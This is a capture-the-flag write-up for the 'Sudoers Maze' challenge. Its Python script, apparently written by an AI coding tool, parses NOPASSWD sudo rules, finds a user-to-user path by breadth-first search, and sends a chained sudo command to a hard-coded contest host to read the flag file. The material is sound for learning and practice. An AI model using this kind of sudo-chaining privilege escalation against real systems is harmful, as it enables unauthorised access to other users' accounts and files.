# Sudoers Maze

The attachment contains a large sudoers file:

```
# entrance to the maze
user ALL=(u0) NOPASSWD: ALL
u0 ALL=(u499) NOPASSWD: ALL
u1 ALL=(u377, u751) NOPASSWD: ALL
u2 ALL=(u171) NOPASSWD: ALL
u3 ALL=(u504, u878) NOPASSWD: ALL
u4 ALL=(u298, u461, u835) NOPASSWD: ALL
```

We need to find a path from u0 to u1000 to read the flag. Attack script:

```python
#!/usr/bin/env python3
"""
TSGCTF 2025 - sudoers-maze Exploit
Author: Qwen Code
Description: Exploit for the sudoers-maze challenge that navigates through
             a complex sudoers configuration to read the flag as u1000.
"""

import re
import socket
import time
from collections import defaultdict, deque
import sys

def parse_sudoers(sudoers_content):
    """
    Parse sudoers content and build adjacency list for the graph.
    
    Args:
        sudoers_content: String containing sudoers file content
        
    Returns:
        dict: Adjacency list mapping source users to list of target users
    """
    adj = defaultdict(list)
    
    for line in sudoers_content.split('\n'):
        line = line.strip()
        # Match lines like: uX ALL=(uY[, uZ...]) NOPASSWD: ALL
        match = re.match(r'^u(\d+)\s+ALL=\(([^)]+)\)\s+NOPASSWD:\s+ALL$', line)
        if match:
            source = int(match.group(1))
            targets = match.group(2)
            # Parse comma-separated target users
            for target in targets.split(', '):
                target_match = re.match(r'^u(\d+)$', target.strip())
                if target_match:
                    adj[source].append(int(target_match.group(1)))
    
    return adj

def find_path(start, target, adj):
    """
    Find shortest path from start to target using BFS.
    
    Args:
        start: Starting user ID
        target: Target user ID
        adj: Adjacency list
        
    Returns:
        list: Path as list of user IDs, or None if no path exists
    """
    if start == target:
        return [start]
    
    visited = set()
    queue = deque()
    queue.append((start, [start]))
    
    while queue:
        current, path = queue.popleft()
        
        if current in visited:
            continue
        visited.add(current)
        
        for neighbor in adj.get(current, []):
            if neighbor == target:
                return path + [neighbor]
            if neighbor not in visited:
                queue.append((neighbor, path + [neighbor]))
    
    return None

def generate_exploit_command(path):
    """
    Generate the sudo chain command to navigate the path.
    
    Args:
        path: List of user IDs from start to target
        
    Returns:
        str: Sudo chain command
    """
    if len(path) < 2:
        return ""
    
    # Build: sudo -u uX sudo -u uY ... cat /home/user/flag.txt
    chain = "sudo"
    for user in path[1:]:
        chain += f" -u u{user} sudo"
    
    # Remove last "sudo" and add cat command
    chain = chain[:-4]  # Remove " sudo"
    chain += "cat /home/user/flag.txt"
    
    return chain

def execute_exploit(host, port, sudoers_content):
    """
    Execute the full exploit against the remote service.
    
    Args:
        host: Target host
        port: Target port
        sudoers_content: Content of sudoers file
        
    Returns:
        str: Flag if found, None otherwise
    """
    print(f"[*] Parsing sudoers file...")
    adj = parse_sudoers(sudoers_content)
    
    print(f"[*] Finding path from u0 to u1000...")
    path = find_path(0, 1000, adj)
    
    if not path:
        print("[-] No path found from u0 to u1000!")
        return None
    
    print(f"[+] Found path with {len(path)-1} steps")
    print(f"[+] Path: {' -> '.join(f'u{n}' for n in path)}")
    
    cmd = generate_exploit_command(path)
    print(f"[+] Generated command ({len(cmd)} chars)")
    
    print(f"[*] Connecting to {host}:{port}...")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(70)
        s.connect((host, port))
        
        # Wait for bash prompt
        time.sleep(1)
        
        print(f"[*] Sending exploit command...")
        s.send((cmd + "\n").encode())
        
        # Send exit to clean up
        time.sleep(0.5)
        s.send("exit\n".encode())
        
        print("[*] Receiving response...")
        response = b""
        start_time = time.time()
        
        while time.time() - start_time < 70:
            try:
                s.settimeout(5)
                chunk = s.recv(4096)
                if chunk:
                    response += chunk
                else:
                    break
            except socket.timeout:
                if time.time() - start_time > 65:
                    break
                continue
            except Exception as e:
                print(f"[-] Error receiving: {e}")
                break
        
        s.close()
        
        if response:
            try:
                text = response.decode('utf-8')
            except:
                text = response.decode('latin-1', errors='ignore')
            
            # Look for flag
            if 'TSGCTF{' in text:
                import re
                flag_match = re.search(r'TSGCTF\{[^}]+\}', text)
                if flag_match:
                    return flag_match.group(0)
        
        return None
        
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return None

def main():
    """Main function."""
    import argparse
    
    parser = argparse.ArgumentParser(description='Exploit for sudoers-maze challenge')
    parser.add_argument('--host', default='34.180.66.205', help='Target host')
    parser.add_argument('--port', type=int, default=55655, help='Target port')
    parser.add_argument('--sudoers', default='sudoers_maze/build/sudoers', 
                       help='Path to sudoers file')
    parser.add_argument('--test', action='store_true', 
                       help='Test locally without connecting')
    
    args = parser.parse_args()
    
    # Read sudoers file
    try:
        with open(args.sudoers, 'r') as f:
            sudoers_content = f.read()
    except FileNotFoundError:
        print(f"[-] Could not find sudoers file: {args.sudoers}")
        return
    
    if args.test:
        print("[*] Testing locally...")
        adj = parse_sudoers(sudoers_content)
        path = find_path(0, 1000, adj)
        
        if path:
            print(f"[+] Path found: {' -> '.join(f'u{n}' for n in path)}")
            print(f"[+] Steps: {len(path)-1}")
            cmd = generate_exploit_command(path)
            print(f"[+] Command:\n{cmd}")
        else:
            print("[-] No path found")
    else:
        print(f"[*] Running exploit against {args.host}:{args.port}")
        flag = execute_exploit(args.host, args.port, sudoers_content)
        
        if flag:
            print(f"[+] FLAG: {flag}")
        else:
            print("[-] Failed to get flag")

if __name__ == "__main__":
    main()
```
